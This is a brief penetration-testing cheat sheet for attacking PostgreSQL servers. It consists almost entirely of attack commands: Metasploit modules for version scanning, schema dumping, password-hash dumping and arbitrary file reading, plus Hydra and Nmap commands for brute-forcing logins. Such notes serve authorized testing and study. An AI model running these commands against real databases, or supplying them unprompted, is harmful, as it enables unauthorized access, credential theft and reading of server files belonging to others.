### Version

#### Metasploit module
```
use auxiliary/scanner/postgres/postgres_version
```

### Database Shcema

#### Metasploit module
```
use auxiliary/scanner/postgres/postgres_schemadump
```
### POST

#### Hashdump
```
use auxiliary/scanner/postgres/postgres_hashdump
```
#### Arbitrary file system reading
```
use auxiliary/admin/postgres/postgres_readfile
```
### Bruteforce 

#### Hydra
```
hydra -L USERFILE  -P PASSFILE IP postgres
```
### Nmap Script
```
nmap -p 5432 --script pgsql-brute --script-argsuserdb=users.txt,passdb=pass.txt IP
```
#### Metasploit module
```
use auxiliary/scanner/postgres/postgres_login
```
